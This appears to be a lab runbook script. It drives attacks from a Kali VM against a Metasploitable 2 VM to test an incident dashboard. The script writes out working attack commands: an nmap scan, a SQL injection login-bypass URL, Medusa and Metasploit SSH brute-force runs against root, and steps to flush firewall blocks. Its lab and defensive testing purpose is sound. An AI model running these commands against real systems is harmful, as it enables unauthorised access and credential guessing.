
#  rm -f incidents.db && uvicorn app.main:app --reload
#  dashboard: http://localhost:8000

#  VM IPs:
#    Metasploitable 2 (victim)  →  192.168.64.6
#    Kali Linux (attacker)      →  192.168.64.7
# ═══════════════════════════════════════════════════════════════════════



printf "abc\n123\npassword\nletmein\nadmin\nwrongpass\ntest\nhello\nqwerty\nbadpass\n" > ~/passwords.txt

echo "[SETUP] passwords.txt created at ~/passwords.txt"


#  PHASE 1 — PORT SCAN  [MEDIUM severity]

sudo nmap -sV 192.168.64.6



# ───────────────────────────────────────────────────────────────────────
#  PHASE 2 — SQL INJECTION  [MEDIUM severity]

curl "http://192.168.64.6/mutillidae/index.php?page=login.php&username=admin'%20OR%201=1--&password=x"


# ───────────────────────────────────────────────────────────────────────
#  PHASE 3 — SSH BRUTE FORCE  [HIGH severity]

medusa -h 192.168.64.6 -u root -P ~/passwords.txt -M ssh -t 8 -f



# ───────────────────────────────────────────────────────────────────────
#  PHASE 4 — SSH BRUTE FORCE (Metasploit)  [HIGH severity]  

    msfconsole
    use auxiliary/scanner/ssh/ssh_login
    set RHOSTS 192.168.64.6
    set USERNAME root
    set PASS_FILE ~/passwords.txt
    set THREADS 4
    set VERBOSE true
    run



# ───────────────────────────────────────────────────────────────────────
#  RECOVERY — IF KALI GETS BLOCKED
#  Run on: Metasploitable terminal (SSH from Mac, or directly in UTM)
#
#    ssh msfadmin@192.168.64.6   (password: msfadmin)
#
#  Then run:
#    sudo iptables -F
#    sudo pam_tally --user root --reset
#
#  This clears the IP block and resets the login failure counter.
